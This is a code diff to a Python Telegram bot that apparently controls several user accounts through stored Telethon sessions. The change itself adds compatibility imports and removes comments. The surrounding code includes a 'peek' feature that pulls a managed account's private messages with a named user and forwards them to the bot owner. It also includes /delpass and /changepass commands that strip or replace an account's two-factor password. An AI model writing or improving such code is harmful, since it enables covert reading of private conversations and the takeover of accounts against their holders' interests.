@@ -8,9 +8,13 @@ from telethon.sessions import StringSession
 from telethon.tl.functions.account import (
     GetPasswordRequest, UpdatePasswordSettingsRequest, ResetPasswordRequest
 )
-from telethon.tl.types import (
-    InputCheckPasswordSRP, PasswordInputSettings, InputCheckPasswordEmpty
-)
+from telethon.tl import types as tl_types
+
+# 🔥 Safe imports (Python 3.14 compatibility)
+InputCheckPasswordSRP = getattr(tl_types, 'InputCheckPasswordSRP', None)
+InputCheckPasswordEmpty = getattr(tl_types, 'InputCheckPasswordEmpty', None)
+PasswordInputSettings = getattr(tl_types, 'PasswordInputSettings', None)
+
 from motor.motor_asyncio import AsyncIOMotorClient
 
 # ==========================================
@@ -244,7 +248,6 @@ async def cgift_selfbot_handler(event):
 # 👀 PEEK LOGIC
 # ==========================================
 async def perform_peek(userbot_id, target_username, owner_chat_id):
-    """Read DM history between selfbot and target user, forward to owner."""
     config = userbot_instances.get(userbot_id)
     if not config:
         return False, "Userbot not found"
@@ -268,7 +271,6 @@ async def perform_peek(userbot_id, target_username, owner_chat_id):
     if total == 0:
         return False, "No messages found"
     
-    # Send header to owner
     try:
         await client.send_message(
             owner_chat_id,
@@ -281,9 +283,8 @@ async def perform_peek(userbot_id, target_username, owner_chat_id):
     except Exception as e:
         return False, f"Cannot message owner: {e}"
     
-    # Forward in batches (oldest first)
     msg_ids = [m.id for m in messages]
-    msg_ids.reverse()  # oldest first
+    msg_ids.reverse()
     
     forwarded = 0
     for i in range(0, len(msg_ids), PEEK_FORWARD_BATCH):
@@ -293,7 +294,7 @@ async def perform_peek(userbot_id, target_username, owner_chat_id):
             forwarded += len(batch)
         except Exception as e:
             print(f"⚠️ Forward batch error: {e}")
-        await asyncio.sleep(1)  # avoid flood
+        await asyncio.sleep(1)
     
     try:
         await client.send_message(
@@ -514,7 +515,6 @@ async def handle_bot_commands(event):
             await event.reply("⚠️ **No @username provided.**")
             return
         
-        # Find @username in text
         m = re.search(r"@[\w\d_]+", target_username)
         if m:
             target_username = m.group(0)
@@ -522,7 +522,6 @@ async def handle_bot_commands(event):
             target_username = "@" + target_username
         
         await event.reply(f"👀 **Peeking @{target_username.lstrip('@')} via selfbot `{target_uid}`...**\nThis may take a while (up to {PEEK_LIMIT} msgs).")
-        
         asyncio.create_task(perform_peek(target_uid, target_username, event.chat_id))
 
     # ---------- /idsave ----------
@@ -627,6 +626,9 @@ async def handle_bot_commands(event):
 
     # ---------- /delpass ----------
     elif cmd == "/delpass":
+        if not PasswordInputSettings or not InputCheckPasswordSRP:
+            await event.reply("❌ **2FA types not available in this Telethon version.**")
+            return
         parts = args.split(maxsplit=1)
         if len(parts) < 2:
             await event.reply("⚠️ **Usage:** `/delpass [User_ID] [CurrentPassword]`")
@@ -657,6 +659,9 @@ async def handle_bot_commands(event):
 
     # ---------- /changepass ----------
     elif cmd == "/changepass":
+        if not PasswordInputSettings or not InputCheckPasswordSRP or not InputCheckPasswordEmpty:
+            await event.reply("❌ **2FA types not available in this Telethon version.**")
+            return
         parts = args.split(maxsplit=2)
         if len(parts) < 3:
             await event.reply("⚠️ **Usage:** `/changepass [User_ID] [OldPass] [NewPass]`")
